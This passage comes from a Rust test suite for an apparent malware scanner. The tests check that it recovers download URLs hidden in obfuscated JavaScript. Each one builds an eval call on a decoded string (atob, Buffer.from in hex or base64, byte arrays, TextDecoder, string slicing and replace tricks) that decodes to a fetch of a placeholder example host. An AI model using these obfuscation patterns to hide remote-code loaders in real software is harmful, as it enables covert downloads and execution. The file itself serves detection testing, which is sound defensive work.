        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-template-js.example/p')",
        );
        let js = format!("eval(atob(`{encoded}`))").into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-template-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob template literal payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_optional_call_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-optional-call-js.example/p')",
        );
        let js = format!(r#"eval(atob?.("{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-optional-call-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob optional-call payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_reversed_string_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-reversed-string-js.example/p')",
        );
        let reversed: String = encoded.chars().rev().collect();
        let js = format!(r#"eval(atob("{reversed}".split("").reverse().join("")))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-reversed-string-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob reversed string payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_sliced_string_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-sliced-string-js.example/p')",
        );
        let js = format!(r#"var b = "xx{encoded}zz"; eval(atob(b.slice(2, -2)))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-sliced-string-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob sliced string payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_substr_string_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-substr-string-js.example/p')",
        );
        let len = encoded.len();
        let js = format!(r#"var b = "xx{encoded}zz"; eval(atob(b.substr(2, {len})))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-substr-string-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob substr string payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_substring_string_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-substring-string-js.example/p')",
        );
        let end = encoded.len() + 2;
        let js =
            format!(r#"var b = "xx{encoded}zz"; eval(atob(b.substring(2, {end})))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-substring-string-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob substring string payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_substring_then_replace_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-substring-replace-js.example/p')",
        );
        let noisy = encoded
            .chars()
            .map(|ch| format!("{ch}~"))
            .collect::<String>();
        let end = noisy.len() + 2;
        let js = format!(
            r#"var b = "xx{noisy}zz"; eval(atob(b.substring(2, {end}).replace(/~/g, "")))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-substring-replace-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob substring replace payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_bracket_replace_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-bracket-replace-js.example/p')",
        );
        let noisy = encoded
            .chars()
            .map(|ch| format!("{ch}~"))
            .collect::<String>();
        let js = format!(r#"var b = "{noisy}"; eval(atob(b["replace"](/~/g, "")))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-bracket-replace-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob bracket replace payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_bound_bracket_replace_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-bound-bracket-replace-js.example/p')",
        );
        let noisy = encoded
            .chars()
            .map(|ch| format!("{ch}~"))
            .collect::<String>();
        let js = format!(r#"var m = "replace"; var b = "{noisy}"; eval(atob(b[m](/~/g, "")))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-bound-bracket-replace-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob bound bracket replace payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_trimmed_string_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-trimmed-string-js.example/p')",
        );
        let js = format!(r#"var b = "  {encoded}  "; eval(atob(b.trim()))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-trimmed-string-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob trimmed string payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_optional_chain_trimmed_string_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-optional-trim-js.example/p')",
        );
        let js = format!(r#"var b = "  {encoded}  "; eval(atob(b?.trim()))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-optional-trim-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob optional-chain trim payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_replace_all_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-replace-all-js.example/p')",
        );
        let noisy = encoded
            .chars()
            .map(|ch| format!("{ch}~"))
            .collect::<String>();
        let js = format!(r#"var b = "{noisy}"; eval(atob(b.replaceAll("~", "")))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-replace-all-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob replaceAll payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_replace_all_bound_args_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-replace-all-bound-args-js.example/p')",
        );
        let noisy = encoded
            .chars()
            .map(|ch| format!("{ch}~"))
            .collect::<String>();
        let js = format!(
            r#"var marker = "~"; var empty = ""; var b = "{noisy}"; eval(atob(b.replaceAll(marker, empty)))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-replace-all-bound-args-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob replaceAll bound args payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_split_join_delimited_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-split-join-delimited-js.example/p')",
        );
        let noisy = encoded
            .chars()
            .map(|ch| format!("{ch}~"))
            .collect::<String>();
        let js = format!(r#"var b = "{noisy}"; eval(atob(b.split("~").join("")))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-split-join-delimited-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob split join delimited payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_concat_method_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-concat-method-js.example/p')",
        );
        let split = encoded.len() / 2;
        let first = &encoded[..split];
        let second = &encoded[split..];
        let js = format!(r#"var a = "{first}"; var b = "{second}"; eval(atob(a.concat(b)))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-concat-method-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob concat method payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_to_string_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-to-string-js.example/p')",
        );
        let js = format!(r#"var b = "{encoded}"; eval(atob(b.toString()))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-to-string-js.example/p"
            )
        });
        assert!(has, "JS atob toString payload URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_buffer_from_base64_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://buffer-from-base64-js.example/p')",
        );
        let js = format!(r#"var b = "{encoded}"; eval(Buffer.from(b, "base64").toString())"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-base64-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from base64 payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_new_buffer_base64_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://new-buffer-base64-js.example/p')",
        );
        let js = format!(r#"var b = "{encoded}"; eval(new Buffer(b, "base64").toString("utf8"))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://new-buffer-base64-js.example/p"
            )
        });
        assert!(
            has,
            "JS new Buffer base64 payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_new_buffer_byte_array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://new-buffer-byte-array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(new Buffer([{bytes}]).toString())"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://new-buffer-byte-array-js.example/p"
            )
        });
        assert!(
            has,
            "JS new Buffer byte array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_new_buffer_bound_byte_array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://new-buffer-bound-byte-array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = [{bytes}]; eval(new Buffer(a).toString())"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://new-buffer-bound-byte-array-js.example/p"
            )
        });
        assert!(
            has,
            "JS new Buffer bound byte array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_base64url_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::URL_SAFE_NO_PAD,
            "fetch('https://buffer-from-base64url-js.example/p')",
        );
        let js = format!(r#"var b = "{encoded}"; eval(Buffer.from(b, "base64url").toString())"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-base64url-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from base64url payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_hex_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-hex-js.example/p')";
        let encoded = payload
            .as_bytes()
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect::<String>();
        let js =
            format!(r#"var b = "{encoded}"; eval(Buffer.from(b, "hex").toString())"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-hex-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from hex payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_hex_utf16le_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-hex-utf16le-js.example/p')";
        let encoded = payload
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .map(|byte| format!("{byte:02x}"))
            .collect::<String>();
        let js = format!(r#"var b = "{encoded}"; eval(Buffer.from(b, "hex").toString("utf16le"))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-hex-utf16le-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from hex UTF-16LE payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_byte_array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-byte-array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(Buffer.from([{bytes}]).toString())"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-byte-array-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from byte array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_bound_byte_array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-bound-byte-array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = [{bytes}]; eval(Buffer.from(a).toString())"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-bound-byte-array-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from bound byte array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_utf16le_byte_array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-utf16le-byte-array-js.example/p')";
        let bytes = payload
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .map(|byte| byte.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(Buffer.from([{bytes}]).toString("utf16le"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-utf16le-byte-array-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from UTF-16LE byte array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_bound_utf16le_byte_array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-bound-utf16le-byte-array-js.example/p')";
        let bytes = payload
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .map(|byte| byte.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!(r#"var a = [{bytes}]; eval(Buffer.from(a).toString("utf16le"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-bound-utf16le-byte-array-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from bound UTF-16LE byte array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-uint8array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(Buffer.from(new Uint8Array([{bytes}])).toString())"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-uint8array-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_bound_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-bound-uint8array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = new Uint8Array([{bytes}]); eval(Buffer.from(a).toString())"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-bound-uint8array-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from bound Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_uint8array_from_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-uint8array-from-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!(r#"eval(Buffer.from(Uint8Array.from([{bytes}])).toString())"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-uint8array-from-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from Uint8Array.from payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_uint8array_of_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-uint8array-of-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(Buffer.from(Uint8Array.of({bytes})).toString())"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-uint8array-of-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from Uint8Array.of payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_bound_uint8array_of_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-bound-uint8array-of-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = Uint8Array.of({bytes}); eval(Buffer.from(a).toString())"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-bound-uint8array-of-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from bound Uint8Array.of payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_buffer_from_bound_uint8array_from_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://buffer-from-bound-uint8array-from-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = Uint8Array.from([{bytes}]); eval(Buffer.from(a).toString())"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://buffer-from-bound-uint8array-from-js.example/p"
            )
        });
        assert!(
            has,
            "JS Buffer.from bound Uint8Array.from payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-uint8array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!(r#"eval(new TextDecoder().decode(new Uint8Array([{bytes}])))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-uint8array-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_int8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-int8array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!(r#"eval(new TextDecoder().decode(new Int8Array([{bytes}])))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-int8array-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder Int8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_uint8clampedarray_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-uint8clampedarray-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(new TextDecoder().decode(new Uint8ClampedArray([{bytes}])))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-uint8clampedarray-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder Uint8ClampedArray payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_encoding_arg_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-encoding-arg-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(new TextDecoder("utf-8").decode(new Uint8Array([{bytes}])))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-encoding-arg-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder encoding arg Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_buffer_from_base64_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://textdecoder-buffer-base64-js.example/p')",
        );
        let js = format!(r#"eval(new TextDecoder().decode(Buffer.from("{encoded}", "base64")))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-buffer-base64-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder Buffer.from(base64) payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_instance_buffer_from_base64_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://textdecoder-instance-buffer-base64-js.example/p')",
        );
        let js = format!(
            r#"var td = new TextDecoder(); eval(td.decode(Buffer.from("{encoded}", "base64")))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-instance-buffer-base64-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder instance Buffer.from(base64) payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_encoding_instance_buffer_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-encoding-instance-js.example/p')";
        let bytes = payload
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect::<Vec<_>>();
        let encoded = bytes
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect::<String>();
        let js = format!(
            r#"var enc = "utf-16le"; var td = new TextDecoder(enc); eval(td.decode(Buffer.from("{encoded}", "hex")))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-encoding-instance-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound encoding instance payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_utf8_options_arg_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-options-arg-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(
            r#"eval(new TextDecoder("utf-8", {{ fatal: false }}).decode(new Uint8Array([{bytes}])))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-options-arg-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder UTF-8 options arg Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_window_textdecoder_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://window-textdecoder-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(new window.TextDecoder().decode(new Uint8Array([{bytes}])))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://window-textdecoder-js.example/p"
            )
        });
        assert!(
            has,
            "JS window.TextDecoder Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
